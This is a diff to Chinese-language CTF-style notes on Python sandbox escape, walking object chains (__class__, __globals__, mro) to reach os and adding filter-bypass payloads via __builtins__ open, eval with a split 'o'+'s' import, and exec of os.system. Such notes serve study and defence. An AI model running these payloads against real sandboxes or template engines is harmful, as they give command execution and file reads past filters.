@@ -10,8 +10,10 @@ class cat():
     def __init__(self):
         pass
 print(cat().__class__.__init__.__globals__['os'].popen('id').read())
-cat为自定义的类,导入了os模板影响了cat,此时他就可以使用os
+
 ```
+
+##### **cat为自定义的类,导入了os模板影响了cat,此时他就可以使用os**
 
 
 
@@ -80,6 +82,8 @@ os.environ                   # 读环境变量（常藏 flag）
 ().__class__.__bases__			直接父类们（多继承）
 ```
 
+##### 如果父类不是object就一直`__base__`往上爬,终点一定是object
+
 ### 2.2使用mro找出他的上级object属性
 
 ```
@@ -103,3 +107,31 @@ os.environ                   # 读环境变量（常藏 flag）
 ```
 
 **由于使用的()之类的字面量源码包没有导入os,所以使用要用popen**
+
+
+
+## 可替换绕过检测方案:
+
+### `__builtins__`绕过全局字典,`__builtins__`含有eval,open,`exec`等方法
+
+### 1.绕过执行命令,直接读取文件使用
+
+```
+ ...__globals__['__builtins__']['open']('/flag').read()
+```
+
+#### 
+
+### 2.绕过os被封禁,用eval直接 执行一段表达式
+
+```
+...__globals__['__builtins__']['eval']("__import__('o'+'s').popen('id').read()")
+eval只能用于执行一段表达式,不能执行语句
+```
+
+### 3.用exec函数命令执行
+
+```
+...__globals__['__builtins__']['exec']("import os\nos.system('id')")
+```
+
